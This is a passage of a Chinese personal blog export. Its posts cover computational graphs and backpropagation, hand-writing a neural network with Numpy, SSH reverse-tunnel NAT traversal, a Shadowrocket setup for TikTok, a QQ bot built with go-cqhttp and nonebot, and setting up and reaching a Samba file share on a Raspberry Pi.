\n\n\n我再补充一点，即在有向的意义上，计算图是无环的。\n\n\n这个定义感觉啥也没说，还是先举一个例子看看吧：\n\n\n对于这样一个计算式：$e=z\\times(x+y)$，我们可以构造以下计算图：\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/ee513d40afa9284c25a7778f4f4dd254.jpg)\n对比计算式和计算图，容易猜到计算图的构造方法：若有两个数，或者更一般地，N个数（N≥1），通过某种运算得到另一个数，那么在计算图中，我们就在这N个数所在的节点上各引出一条箭头，指向运算得到的结果，同时在运算结果的节点上，记录下运算符号。\n\n\n在上面这个图中，有唯一的输出元素，称为“根”，若不考虑$z\\times(x+y)$可能继续参与的之后的运算，那么这个计算图的“根”即是$z\\times(x+y)$，或$e$所在的节点。不由任何其他数运算得来的数称为图上的“叶子”，在此例里，“叶子”有三个：$x,y,z$所在的节点，这是因为它们并不是通过其他数字运算得到的，换句话说，没有任何节点指向它们。\n\n\n有一点需要说明一下，上面的定义里提到，节点对应于数学运算，但个人认为，其实每个节点可以把运算的结果存储进去，这个是后面写代码时需要考虑的事情。\n\n\n由一些数通过运算得来的数，若其不是“根”，我把它称为“中间结果”，在上面的例子里，加号所在节点表示的数$(x+y)$是一个“中间结果”，但其实“中间结果”和“根”在本质上好像没什么区别，唯一区别就是到了“根”这个位置，图终止了。\n\n\n上面这个例子里的运算式非常的简单，但即使在复杂的神经网络中，最终的损失（Loss）也是通过一系列的上面这样简单的运算得到的，因此完全可以类似地构造一个计算图（当然神经网络的计算图可能会复杂到不能看，故这里不再举例子，[此链接](https://oss.fyz666.xyz/blogfiles/pdf/34efcd4501a5e5c9521ac5eb59f77b34.pdf)给出了一个仅仅只有二层的LSTM的计算图，诸位可以细品一下），计算图可以完全表达出神经网络的结构与运算顺序，因此在神经网络中至关重要。\n\n\n相信看到这里，聪明的你肯定看明白了计算图的构造过程，接下来，就涉及到神经网络的训练方法——误差逆传播算法。\n\n\n## 误差逆传播算法\n\n\n类似于一些简单的机器学习模型，神经网络这种庞然大物也通过梯度下降进行训练，所谓梯度下降，就类似于水往低处流，把训练时计算得到的误差看成是对神经网络中所有参数的函数，将误差对所有参数求梯度，然后让每个参数沿着其梯度方向进行更新迭代，在适当的步长下，就能让误差收敛于极小值点。\n\n\n对于简单的函数，我们通过纸笔甚至心算就能算出其对每个变量的梯度，但神经网络结构复杂，算梯度的事还是交给计算机来完成吧。神经网络的著名算法“误差逆传播”就是用来解决这个事的。\n\n\n**误差逆传播是指一种神经网络模型对它的每一个需要计算梯度的参数计算梯度的最常用的算法。**\n\n\n我们继续回顾前面一个简单的例子，现在假设有一个简单到离谱的神经网络，只有两个参数$y,z$，而且其Loss的计算过程恰好就是$e=z\\times(x+y)$，这里假设$x$是一个常数，姑且理解为训练数据好了hhh，它相当于一个不需要计算梯度的“叶子”。那么我们就需要分别计算$e$对$y$和$z$的梯度。\n\n\n通过简单的链式法则易知：\n\n\n$$\\begin{aligned}\\frac{\\partial e}{\\partial y}& = \\frac{\\partial e}{\\partial (x+y)}\\frac{\\partial (x+y)}{\\partial y}\\\\&=z\\times 1 = z \\\\ &\\frac{\\partial e}{\\partial z}= x+y\\end{aligned}$$\n\n\n注意上面第一个式子，细心的朋友可就发现了$e$对“叶子”节点$y$的梯度恰好相当于$e$对“中间结果”$(x+y)$的梯度与$(x+y)$对$y$的梯度的乘积，相当于如果我们已经得到了误差对某个中间结果的梯度，就可以将这个对中间结果的梯度用于更前向的梯度计算中，而不用从头开始重新算一遍。这也是误差逆传播名称的由来，这误差看上去就是逆着计算图的箭头从“根”流向“叶子”。\n\n\n对于复杂的神经网络，也是如此。\n\n\n通过计算图，我们可以轻松地“反其道而行”，得到误差对每一个叶子节点的梯度。\n\n\n具体实现的时候，从根节点到叶子节点的路径很可能不止一条，例如以下这个例子：\n\n\n$e=(x+y)\\times x$，你可以自己试试将其画成计算图，然后试图用计算图的想法对$x$计算梯度（其实就是让你巩固一下链式法则罢了）不要算的太快，记得把中间结果写出来。\n\n\n上面这个式子对$x$算梯度的时候，就有两条路径，分别是$e\\to (x+y)\\to x$和$e\\to x$，对每一条路径，都可以计算一个对$x$的偏导数出来，而最后$e$对$x$的梯度，则是把两部分进行求和，最后的结果便是$2\\times x+y$，与直接口算的结果肯定是一样的。\n\n\n从上面这个例子结合梯度的链式法则，可以看出，只要从根节点出发，深度优先遍历整个图，对叶子节点的每一次访问都相当于找到了一条梯度传播路径，将对某个叶子节点的所有路径上得到的偏导数进行求和，便得到对该叶子节点的梯度。另外，计算图的无环性也保证了路径不会进入循环，也就是说只要你沿着箭头的反方向走，就一定可以到达一片叶子，不会进入循环。以上就是通过计算图来计算叶子节点梯度的思路。\n\n\n以上就是误差逆传播算法及计算图在此算法中起到的作用，若有不理解的，~~你上手写一下就理解了~~，欢迎来和我讨论。\n\n\n## 计算图的构建方式\n\n\n何为计算图的构建方式？说白了就是给你一个神经网络，你要通过什么方法把它的计算图搭出来。\n\n\n计算图一旦能顺利搭出来，接下来就只需要处理各种运算的梯度就好了，困难也~~迎刃而解~~才走了不到五分之一（因为我发现各种运算的梯度计算才是最顶的/手动捂脸）。不过这样设计，耦合度瞬间降低了不少，只要为每种运算分别写一个梯度函数就好了。\n\n\n但不论如何，这一步都是要做的，所以不妨先了解一下市面上都有哪些常用的构建方式。\n\n\n计算图的构建方式主要有以TensorFlow、Caffe为代表的静态图以及以PyTorch为代表的动态图，二者的区别主要就体现在名字上。\n\n\n动态图是指计算和图的构建过程同时进行的机制，通俗的讲，每计算一步，都会在已得到的图上增加一部分，计算至最终结果时，计算图即构建完成。这种方法每一步都能得到中间结果，更易于调试，而且实际写模型时，更容易把脑子里的idea转化为代码，编写效率更高。\n\n\n静态图则与动态图不同，它是先将计算图定义好（包含正向传播和反向传播的运算流），在定义好计算图后，才开始正式计算。好处在于，计算图不需要多次构建，而是一次构建多次使用，运行效率理论上会更高（注意，是理论上，实际上科研人员并没有显著感觉PyTorch比TensorFlow慢多少）。但后果就是，较难及时拿到中间结果，调试难度更大，学习成本高。\n\n\n其实我一开始写的时候并没有刻意想过究竟用哪种方式来构建计算图，而是直接用符合正常人思维的方式来写代码，写的差不多以后才发现，啊，原来这就是动态图。也是很灵性了。话又说回来，为什么Google在开发TensorFlow时会想到如此不符合正常人思维的静态图？大概是有其独到的想法吧。\n\n\n---\n\n神经网络中，张量是一切计算的核心，下一篇文章打算简单讲一下我用Numpy封装的张量类。\n","tags":["神经网络","反向传播"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——为什么要手撸NN？（附带一些个人想法）","url":"//blog/5640/","content":"\n鄙人本科从数学系毕业后，转入了人工智能领域进行硕士阶段的学习，众所周知，目前该领域最炙手可热的模型便是神经网络（Neural Network），生活中到处都是关于它的例子，例如随处可见的人脸识别系统、使得各国人民间能够愉快交流的翻译软件、手机输入法上的语音转文字系统等，可以说神经网络已经充分渗入到了大众的生活中。\n\n甚至，基于神经网络广泛的应用环境，除了我们这个算是科班的研究领域，其在各种其他的领域也大放异彩，我了解到许多其他专业的同学，都能娴熟地调用各种深度学习库进行一些关于自身领域模型的训练，全民深度学习时代的到来意味着我们科班出身的研究者不能甘心于成为别人口中的调包侠、调参侠，我们在调包、调参的时候有必要去深入了解其背后的细节原理，从而掌握对模型自身结构的认识，~~在调参的时候更有方向感~~（bushi，怎么说了半天还是调参侠）可以对神经网络这个暗箱的行为更加熟悉和敏感，从而在自己搭建新的模型时做到事半功倍的效果。\n\n\n而深入理解神经网络原理的唯一方法，就是自己手撸一个出来。这样达到的效果远比你看数十篇诸如《一分钟看懂神经网络》、《神经网络原理深度剖析》这样的博客要好得多。基于此，如果你正在看我这个系列的文章，并且也有深入理解神经网络原理的想法，我强烈建议你不要只看不做，在这个领域，多动手才是正道。同时，此系列文章将默认你已经看了各种上述博客，自认为对神经网络的基本原理有了明确的认识，熟知一些术语，如果对基本的概念尚不是很清楚，建议出门右拐。\n\n\n不过我决定手撸一个神经网络完全是因为研一的深度学习课上，老师提了一嘴：“有兴趣的同学可以去自己手写一个玩玩”。\n\n\n说干就干，第二天我就开始准备手撸神经网络，先从编程语言的选择开始，关于这点，我觉得既然只要验证神经网络原理，不需要在代码上追求过高的运行效率和空间利用率，那么易于开发的语言当然是最好的，因此我选择使用Python，主要调用其著名的科学运算库Numpy来封装自己的神经网络（我不会告诉你其实是因为我当时除了Python啥也不会）。\n\n\n在半个月左右以后，一个主要基于Numpy，能实现几乎所有的常见矩阵运算、线性全连接层、一维二维卷积池化及BN操作、多种激活函数和损失函数的神经网络“库”就封装的差不多了，后面又修修补补了一些内容，代码在[此仓库](https://github.com/windshadow233/autograd-with-numpy)，代码写的非常的垃圾，但理解神经网络的初衷达到了。项目里主要用mnist数据集进行了验证（模型比较简单，准确率99%左右），后面还训练了一个孪生神经网络用以人脸验证，在预处理好的LFW测试集上达到了100%的准确率（当时自己都被震惊到）。\n\n\n在项目结束十个月后，偶然又回过头看了下之前的代码，发现以前的思路也是忘的比较干净，代码只有上帝能看懂了，但突然想来写一个系列，把之前的思路捡起来，总结几篇blog，方便后人学习，更便于以后的我再次回顾。\n\n\n这个系列将结合我自己在该项目上的学习经验，简单讲解一下个人认为最容易理解的神经网络的手撸方法，另外，网络上也有不少神经网络的手撸教程，但大多是教你撸最简单的多层感知器（MLP），你也一定看到过不少基于递推式的MLP反向传播代码，但这种写法个人并不推荐，因为过于注重递推式会导致容易忽略掉其核心原理。可能由于我比较菜，我一开始入门的时候，也是轻松就把MLP的反传递推公式推出来了，但在写代码的过程中，一堆字母，比如常见的$x$（线性变换前）, $z$（线性变换后）,$a$（激活后）以及乱七八糟的下标（不同的博客表示方式还不一样），着实把我绕晕了，结果导致我80%的时间都在纠结字母对应关系和下标加减1的问题。递推式的存在也让这种手撸神经网络的写法耦合度过高，稍微换一下网络的结构，原来的递推式就废了，新的递推式你很可能又要花大量时间去推导，如果数学能力差一点，你很有可能到头来只会推那一套递推式，所以个人不推荐这种写法。但如果你就想单纯搭个MLP，不想有更深层次的理解，那可以试试，至少工作量比较小。\n\n\n这篇文章净讲废话了，硬核内容从下一篇文章开始更新。这个系列会很长，写完以后才感觉，其实15篇都不够我写的，各位若有兴趣，烦请耐心看完。\n","tags":["Python","神经网络","机器学习"],"categories":["机器学习"]},{"title":"通过SSH隧道端口转发实现内网穿透","url":"//blog/5613/","content":"\n前面介绍了一种[使用V2ray实现的内网穿透方法](/blog/5473/)，虽然达成了目的，但有诸多不足，例如必须在两台设备上同时运行V2ray，配置文件比较难懂等。尤其是对平时没有科学上网需求（自然也没有科学上网经历）的同学而言，下载V2ray本就是件令人头疼的事。\n\n\n\n但事实上，常用的ssh命令也可以用来搞内网穿透，只需要一条命令即可。\n\n\n现在假设我们面临如下图所示的一种情形：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/5e417812f0fe6017672c1eee36379693.jpg)\n\n左侧蓝色框内为家里的局域网，其中包含了一台运行80端口Web服务的服务器Server C，其内网IP为192.168.1.100，通过路由器的NAT地址转换接入Internet。右侧绿色框内为外部的互联网，其中有一台拥有公网IP地址（1.2.3.4）的服务器Server B。另有一台能访问互联网，但未接入左侧局域网的设备Laptop A。现Laptop A想通过连接Server B的8080端口来访问Server C80端口上的Web服务。\n\n\n可见该情形就是最一般的内网穿透情形，在上面的网络拓扑结构中，既然Server B拥有公网IP，我们可以不过分地假设Server C能通过SSH与Server B建立连接，其中，Server B的SSH登录用户名为user。另外，只要Server B愿意，Laptop A也可以正常访问到它，那么就可以通过在Server C到Server B之间建立SSH隧道，来实现Laptop A对Server C的访问。\n\n\n接下来先简单介绍一下ssh命令中的端口转发功能，这里用到的端口转发称为所谓的“远程端口转发”，另外还有“本地端口转发”等。“远程端口转发”命令常用格式如下：\n\n\n\n```bash\nssh -R [bind_address:]port:host:hostport user@ip\n```\n\n-R表示remote，bind_address和port表示远程主机上的监听地址、端口对，host和hostport表示目标主机服务的地址、端口对，user与ip分别表示远程主机的用户与公网IP。其中bind_adderss可以省略，在省略情况下，该值相当于0.0.0.0，即监听所有地址。\n\n\n上面的命令达到的目的是，将对公网主机Server B的port端口的访问转发到对内网主机Server C（host）的hostport端口的访问。\n\n\n具体实现方法为（以拓扑图内的IP地址为例）：\n\n\n在Server C上运行命令：\n\n\n\n```bash\nssh -R 8080:localhost:80 user@1.2.3.4\n```\n\n8080是Laptop A访问Server B时用到的端口，localhost和80表示转发的端口是位于本地的80端口，后面的user、1.2.3.4即ssh用户、IP地址对。\n\n\n如果Server C因为某些原因没办法运行ssh命令，可以在局域网中接入一台Linux，然后在该设备上运行命令：\n\n\n\n```bash\nssh -R 8080:192.168.1.100:80 user@1.2.3.4\n```\n\n能达到相同的效果。\n\n\n不过，这样运行命令，会在设备上打开一个shell终端，如果关闭了终端，也将切断建立的SSH隧道，有一点不方便，为了避免之，可以将命令改成如下：\n\n\n\n```bash\nssh -fNR 8080:localhost:80 user@1.2.3.4\n```\n\n新增参数-f表示将SSH转入后台运行，-N表示只连接远程主机，不打开远程shell终端。\n\n\n在实际使用时，除了远程主机防火墙放行所需的8080端口外，还需要对SSH服务进行配置：\n\n\n远程主机Server B需要修改sshd_config文件：\n\n\n\n```bash\nsudo vi /etc/ssh/sshd_config\n```\n\n将文件中的GatewayPorts项设置为yes，该配置表示允许任何人连接到转发的端口，否则将只有远程主机自身可以连接。\n\n\n另外由于一段时间不发送数据包会导致SSH连接自动中断，为了保持SSH的长连接，一般可以从服务端或客户端进行配置，我感觉在客户端配置更灵活一些，即配置在发起SSH连接的设备上，如下：\n\n\nServer C修改ssh_config文件：\n\n\n\n```bash\nsudo vi /etc/ssh/ssh_config\n```\n\n在文件的Host \\*下面加上ServerAliveInterval项：\n\n\n\n```plaintext\nHost *\n    ServerAliveInterval 60\n```\n\n该配置使得客户端每隔60秒向服务器发送一个KeepAlive请求，若服务器发出响应，则保持连接。\n\n\n\n\n---\n\n经过实测，使用该方法进行内网穿透需要稳定持续的网络连接作为保证，我在校园网状态下，一旦切换网络流量出口便会导致SSH隧道断开。\n","tags":["Linux","SSH","计算机网络","内网穿透"],"categories":["瞎捣鼓经历"]},{"title":"大陆iOS系统免拔卡解锁TikTok","url":"//blog/5583/","content":"\n得益于一些政策，在中国大陆的我们没有办法直接浏览TikTok（抖音海外版），由于TikTok会通过一些方法检测你的电话卡，把大陆的运营商进行屏蔽，因此即便你挂满了梯子，也没有办法浏览TikTok。本文对iOS系统解决这一问题的过程进行了总结，力图让萌新踩更少的坑。\n\n本文参考自下面仓库：\n\n{% link TikTok-Unlock,GitHub,https://github.com/Semporia/TikTok-Unlock %}\n\n\n首先，你得有个梯子。\n\n\n最简单粗暴的方法：直接拔卡，但该方法对于只有一台手机设备，没有平板的穷人而言不太友好，因此下面给出一种不需要拔卡的方法。\n\n\n此教程所使用的软件为Shadowrocket。\n\n\n操作过程只需按上面链接，找到关于Shadowrocket的部分，若你使用的是其他软件，可以自己在上面找一下。\n\n\n首先选择你想要访问的国家地区，这里我选择了美区的配置，即`https://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-US.conf`\n\n\n将此配置链接导入到Shadowrocket中，可以看到成功添加了一个新的配置：TiKok-US.conf。\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/b6c0ab9817f97f7b0f81cb23e8f6ad94.jpg)选择该配置并编辑纯文本，在其中空白区域加上以下内容（GitHub项目里的文件漏掉了末尾的PROXY，会导致规则添加失败）：\n\n```raw\n[Rule]\nUSER-AGENT,TikTok*,PROXY\nDOMAIN-KEYWORD,-tiktokcdn-com,PROXY\nDOMAIN-SUFFIX,tiktokv.com,PROXY\nDOMAIN-SUFFIX,tiktokcdn.com,PROXY\nDOMAIN-SUFFIX,tiktok.com,PROXY\nDOMAIN-SUFFIX,tik-tokapi.com,PROXY\nDOMAIN-SUFFIX,snssdk.com,PROXY\nDOMAIN-SUFFIX,sgpstatp.com,PROXY\nDOMAIN-SUFFIX,musical.ly,PROXY\nDOMAIN-SUFFIX,muscdn.com,PROXY\nDOMAIN-SUFFIX,ipstatp.com,PROXY\nDOMAIN-SUFFIX,ibytedtos.com,PROXY\nDOMAIN-SUFFIX,ibyteimg.com,PROXY\nDOMAIN-SUFFIX,byteoversea.com,PROXY\nDOMAIN,p16-tiktokcdn-com.akamaized.net,PROXY\n```\n\n保存配置后，选择“编辑配置”，点击“HTTPS解密”，开启HTTPS解密后，会弹出一个对话框，选择“生成新的CA证书”。低版本的Shadowrocket，生成证书的功能似乎在主界面的“设置”下，自己机灵点找。生成证书以后，点击“安装证书”，即可在本地下载一个描述文件。\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/a584493ad6db79e63680af87952ad8d2.jpg)之后前往手机的设置界面，安装该描述文件，然后进入“通用->关于本机->证书信任设置”，将刚安装的描述文件进行信任即可。\n\n\n在做完上述操作后，开启Shadowrocket，将全局路由设为“配置”，再将配置文件设为TiKok-US.conf，不出意外，就可以正常浏览TikTok啦。若仍然无法浏览，建议将TikTok卸载重下。\n\n\n**本文所介绍的内容主要是为了方便学习、娱乐、开拓国际视野。在墙外请严格约束自身，遵守本国法律法规，切勿在任何地方发布分裂国家，涉恐等违法犯罪的言论。**\n","tags":["科学上网","Shadowrocket"],"categories":["瞎捣鼓经历"]},{"title":"编写一个自己的QQ机器人","url":"//blog/5579/","content":"\n{% note info %}\n更新于2022/9：由于tx增强了风控，我的QQ机器人无法在服务器上进行登录，不排除后期继续加大风控力度的可能，因此我决定不再折腾QQ机器人，而转战生态更丰富、交互性更好的Telegram Bot。\n{% endnote %}\n\n很早以前用过一段时间酷Q平台开发的机器人客户端，结合自己的逻辑进行各种消息的处理回复，但后来因为某种原因，平台跑路了，因此QQ机器人的开发也搁置了一年左右。这两天又想重新通过一些其他途径把机器人整起来。\n\n\n本次QQ机器人的搭建过程用到了[go-cqhttp项目](https://github.com/Mrs4s/go-cqhttp)与nonebot库（作为Python接口），操作系统是64位ARM架构的Linux，当然，需要注册一个QQ小号。\n\n\n## 安装go-cqhttp并登录账号\n\n\n从上面的项目中选择适合64位ARM架构Linux系统（请根据自己的操作系统进行选择）的release最新版本，写此文时，最新版为v1.0.0-beta4，将其上传到目标系统，解压，得到三个文件，其中，文件go-cqhttp为可执行文件，为其添加执行权限：\n\n```bash\nsudo chmod +x go-cqhttp\n```\n\n然后执行：\n\n```bash\n./go-cqhttp\n```\n\n首次执行该程序，会在当前路径下生成一个配置文件（config.yml，若版本较旧，可能为config.json），修改其默认账号配置：uin，password，其他配置暂时不改。\n\n\n然后重新运行go-cqhttp，此时将会出现一些验证操作，我当时遇到的是滑块验证，应该是所有验证方式当中最麻烦的一种，以下是解决方法：\n\n\n1. 在上面运行的程序中选择输入ticket的方式进行验证。\n2. 将其提供的滑块链接复制到浏览器中打开（推荐Chrome、Firefox等）。\n3. 打开开发者工具，选择Network选项卡（有些浏览器里叫“网络”），然后拖动滑块。\n4. 如果验证成功，在Network下会出现一条名为cap_union_new_verify的请求，点开它，选择Preview选项卡，可以看到一条json数据，将数据中的ticket值复制出来，贴到前面程序的命令行中，敲个回车。\n\n如此即可通过验证，并且登录成功后，会在当前目录生成一个device.json文件，以后在这台设备登录该账号，将不需要再次验证。\n\n\n通过go-cqhttp登录账号后，用QQ向该账号发起对话，便可以在命令窗口中看到收到的消息。\n\n\n## 安装nonebot\n\n\nnonebot需要Python版本不低于3.7，我使用的Ubuntu20.04自带Python3.8.5，故可直接安装nonebot，目前nonebot已经出了version2，但由于我之前用的是version1，两个版本的配置方法以及类与接口大有不同，因此我经过一番尝试，仍然选择使用更熟悉的nonebot v1，执行以下pip命令进行安装：\n\n```bash\npip install \"nonebot[scheduler]\"\n```\n\n其中，scheduler是一个可选模块，考虑到以后可能会为机器人加入一些计划任务，故在一开始就可以把它装上。\n\n\n如果不需要此模块，只需：\n\n\n\n```bash\npip install nonebot\n```\n\nnonebot可能会依赖于一些其他模块，例如：msgpack。如果提示缺少，通过pip进行安装就好了。\n\n\n接下来我们手动创建一个最简单的nonebot项目，来放置以后用于QQ机器人的Python脚本。\n\n```bash\nmkdir qqbot\ncd qqbot\ntouch main.py\ntouch config.py\n```\n\nmain.py\n\n```python\nimport nonebot\nimport config\n\nnonebot.init(config)\nif __name__ == \"__main__\":\n    bot = nonebot.get_bot()\n    bot.run()\n```\n\nconfig.py\n\n```python\nfrom nonebot.default_config import *\nAPI_ROOT = 'http://127.0.0.1:5700' # http接口路径\nSUPERUSERS = {********} # 此处添加超级用户的QQ号\nCOMMAND_START = {''} # 此处定义命令的起始符\nNICKNAME = {'小冰'} # 此处定义QQ机器人的昵称，用于在群内将其唤醒\nHOST = '127.0.0.1' # websocket监听地址\nPORT = 8080 # websocket监听端口\n```\n\n执行命令：\n\n```bash\npython main.py\n```\n\n即可将程序启动。若不想让程序占用shell窗口，可以用nohup命令后台运行。\n\n\n## 历史性的第一次对话\n\n\n现在Python脚本已经启动了起来，其在本地的8080端口监听websocket信息，并将调用本地的5700端口作为web api，简单来说，8080端口用于脚本接收QQ消息，5700端口用于脚本发送QQ消息。但此时，由于之前并未在go-cqhttp中配置任何端口信息，因此Python程序和go-cqhttp程序互相不知道对方的存在。\n\n\n接下来对go-cqhttp的配置文件config.yml进行更改，除了最基本的QQ帐号密码外，主要修改的还有`servers`下面的内容：\n\n```yaml\nservers:\n   - ws-reverse: # 反向 Websocket\n      disabled: false\n      universal: \"ws://127.0.0.1:8080/ws/\"\n  #- pprof: #性能分析服务器\n  # HTTP 通信设置\n  - http:\n      # 服务端监听地址\n      disabled: false\n      host: 127.0.0.1\n      # 服务端监听端口\n      port: 5700\n      # 反向HTTP超时时间, 单位秒\n      # 最小值为5，小于5将会忽略本项设置\n      # timeout: 5\n      # middlewares:\n      #   <<: *default # 引用默认中间件\n      # 反向HTTP POST地址列表\n      post:\n      #- url: '' # 地址\n      #  secret: ''           # 密钥\n      #- url: 127.0.0.1:5701 # 地址\n      #  secret: ''          # 密钥\n```\n\n在`ws-reverse`项下面配置universal路径为`ws://<ip>:<port>/ws/`（最后的斜杠有的版本必须得加），ip与port正是前面config.py中设置的`HOST`和`PORT`项（如果前面HOST设为`0.0.0.0`，那么这里的ip可以设置成本机的任意一个ip，建议设为`127.0.0.1`）\n\n\n在`http`项下，同样配置`host`和`port`，声明web api的地址与端口，与前面config.py中的`API_ROOT`对应。\n\n\n然后重新启动go-cqhttp，若看到下面这样的信息，说明程序启动一切正常：\n\n```raw\n...\n[2021-07-23 07:34:22] [INFO]: 资源初始化完成, 开始处理信息. \n[2021-07-23 07:34:22] [INFO]: アトリは、高性能ですから! \n[2021-07-23 07:34:22] [INFO]: 开始尝试连接到反向WebSocket Universal服务器: ws://127.0.0.1:8080/ws/\n[2021-07-23 07:34:22] [INFO]: 正在检查更新. \n[2021-07-23 07:34:22] [INFO]: CQ HTTP 服务器已启动: 127.0.0.1:5700 \n[2021-07-23 07:34:23] [INFO]: 收到服务器地址更新通知, 将在下一次重连时应用.  \n[2021-07-23 07:34:24] [INFO]: 检查更新完成. 当前已运行最新版本. \n```\n\n接下来，先停止go-cqhttp程序，我们将为Python程序增加一些简单的逻辑，以完成简单的对话。\n\n\n进入Python项目目录qqbot下，创建一个新的文件夹bot，用于存放额外文件，在bot文件夹下再创建一个plugins文件夹，用于存放插件脚本，然后创建一个say_hello.py：\n\n```bash\nmkdir bot\nmkdir bot/plugins\nvi bot/plugins/say_hello.py\n```\n\n写入以下内容：\n\n```python\nfrom nonebot import on_command, CommandSession\nimport nonebot\n\n@on_command('hello', aliases=('hi'))\nasync def _(session: CommandSession):\n    await session.send('hello')\n```\n\n便完成了一个最简单的脚本，机器人将对“hello”或“hi”命令做出响应，回复一条“hello”。\n\n\n为了将脚本载入程序，只需将main.py改成如下内容\n\n```python\nimport nonebot\nimport config\nfrom os import path\n\nnonebot.init(config)\nnonebot.load_plugins(\n    path.join(path.dirname(__file__), 'bot', 'plugins'),\n    'bot.plugins'\n)\nif __name__ == '__main__':\n    bot = nonebot.get_bot()\n    bot.run()\n```\n\n重新运行main程序即可。\n\n\n在运行了Python程序以后，再启动前面的go-cqhttp，即可与机器人愉快对话！\n\nnonebot的更多高级的功能，详见其官方文档：\n\n{%link NoneBot,v1.nonebot.dev,https://v1.nonebot.dev/ %}\n\n\n**请仅将此项目用于学习用途，勿作他用！**\n","tags":["Python","CQHTTP","nonebot","QQ bot"],"categories":["瞎捣鼓经历"]},{"title":"如何在一些常用设备（操作系统）上访问局域网内的Samba服务","url":"//blog/5556/","content":"\n[前面文章](/blog/5547/)中写到了Samba服务的部署过程，但未提到如何在局域网的其他设备上访问该服务以获取共享的文件，虽然这些东西谷歌一查就有，但我还是想水个文章，对常用操作系统上访问该服务的方法做一个总结。\n\n## Windows 10/11\n\n\n在Windows 10/11系统上，不需要装任何其他软件，便可访问局域网的Samba服务。以下以Samba服务器的局域网IP地址为192.168.42.2为例。\n\n\n临时访问服务，只需打开文件资源管理器，在地址栏中输入`\\\\192.168.42.2`，敲个回车，即可看到所有共享的目录，若某些共享目录需要身份认证，则双击进入时会要求账号密码。\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/05cbc267343d1ce9f9a6d612d780a049.png)\n![](https://oss.fyz666.xyz/blogfiles/png/e540de06f14845c637edea215eb1e5cc.png)\n若要长期挂载使用，可直接右击“此电脑”，选择“映射网络驱动器”，在界面中输入想要挂载的路径，例如`\\\\192.168.42.2\\public`\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/4ff7c8cac0a1c19d471e963f47adfac6.png)\n不过此方法需要提前知道共享目录的名称。挂载成功后，可以在文件资源管理器的“网络位置”栏看到挂载的目录：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/db23b5c8b9baf835b71b1c1118334d9b.png)\n## Linux\n\n\nLinux系统下同样有很多方法，这里举两个比较简单的方法，其一是直接通过mount命令挂载。\n\n\n首先在本地创建几个用于挂载的文件夹：\n\n```bash\nsudo mkdir /mnt/public\nsudo mkdir /mnt/private\n```\n\n然后执行命令：\n\n```bash\nsudo mount -t cifs //192.168.42.2/public /mnt/public/\n```\n\n挂载向guest开放的public目录。\n\n\n执行命令：\n\n```bash\nsudo mount -t cifs -o user=user1,password=123456 //192.168.42.2/private /mnt/private/\n```\n\n挂载仅向用户user1（密码为123456）开放的private目录。\n\n\n如果上面的挂载无法正常进行，提示缺一个包，则执行以下命令进行安装：\n\n```bash\nsudo apt install cifs-utils\n```\n\n若提示`mount error(2): No such file or directory`，在确保路径没打错的情况下，可检查一下samba的版本，若为2.0版，则在命令里加上：\n\n```bash\nsudo mount -t cifs -o vers=2.0 //192.168.42.2/public /mnt/public/\n```\n\n其二，如果系统带有桌面，很多桌面的文件资源管理器都会带有连接samba、ftp等服务的功能，例如我用的Gnome桌面：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/6a1edeb8535e895b6b805ef4cd1c0a3b.png)\n如此即可轻松访问到samba服务。\n\n\n## iOS\n\n\niOS系统自带一个“文件”应用，打开该应用，点击右上角的三个点，选择“连接服务器”，在服务器栏添加Samba服务的IP地址（例如192.168.42.2），接下来选择身份为客人或注册用户，即可以guest身份或注册用户的身份访问共享目录。同样非常简单，这里不再贴图。\n\n\n其他的系统目前还没有用到，以后用上了再更新此文。\n","tags":["Samba"],"categories":["瞎捣鼓经历"]},{"title":"在树莓派上部署Samba服务实现局域网文件共享","url":"//blog/5547/","content":"\n很早以前买了一块1T的SSD移动硬盘，但找不到啥用处，一直放在家里吃灰，这几天突发奇想，打算把移动硬盘挂载到树莓派上，搞一个局域网文件共享系统，后期可以配合其他设备来实现各种功能。\n\n\n\n通过简单的搜索，我了解到一种通信协议称为SMB（Server Message Block），通过一款叫Samba的软件应用到Linux系统上，实现了Linux与Windows文件共享。而且该服务的配置也通俗易懂容易入门，因此我决定在树莓派上整一个。\n\n\n## 硬件配置\n\n\n主要是树莓派4B（4G内存很够用），另外当然是一块用于存放文件的存储设备（正常人应该不会想用树莓派系统盘作为存储设备吧）\n\n\n## 软件配置\n\n\n树莓派使用了64位Ubuntu 20.04 Server作为运行系统。\n\n\n## 处理存储设备\n\n\n这里我先把SSD格式化了一下，目标格式选择了适应性更广的exFAT，其适合用来存储大容量文件，还可以在Mac和Windows等主流操作系统上通用。\n\n\n将SSD接到树莓派的USB接口上，正常情况下，树莓派可以识别到该SSD的信息。执行以下命令查看SSD的设备名：\n\n\n\n```bash\nsudo fdisk -l\n```\n\n然后将其挂载到一个用于共享文件的目录（我选择的路径是/mnt/shared），指定uid和gid分别为nobody、nogroup，表示公共文件区域，并设置权限为777，为了让exFAT格式的硬盘挂载地更顺利，可以提前安装两个工具包：\n\n\n\n```bash\nsudo apt install exfat-fuse exfat-utils\n```\n\n然后再挂载：\n\n\n\n```bash\nsudo mkdir /mnt/shared\nsudo mount /dev/sda1 -t exfat /mnt/shared -o iocharset=utf8,uid=nobody,gid=nogroup,umask=0000\n```\n\n不出意外的话，硬盘可以挂载到/mnt/shared目录，切换到该目录下，并创建两个文件夹，分别用于存放公共文件与私有文件：\n\n\n\n```bash\ncd /mnt/shared\nsudo mkdir public\nsudo mkdir private\n```\n\n在后面的操作中将实现public目录下的文件公开到局域网下所有用户，private目录下的文件需要通过认证才可访问。\n\n\n## 安装Samba\n\n\n执行命令：\n\n\n\n```bash\nsudo apt install samba samba-common\n```\n\n即可安装该服务。\n\n\n### 全局配置\n\n\n正常情况下，其配置文件应该位于/etc/samba目录下，先对其进行简单的修改：\n\n\n\n```bash\nsudo vi /etc/samba/smb.conf\n```\n\n在前面的`[global]`下增加两行：\n\n\n\n```ini\n[global]\n   ...\n   security = user\n   passdb backend = tdbsam\n```\n\n然后重启服务：\n\n\n\n```bash\nsudo /etc/init.d/smbd 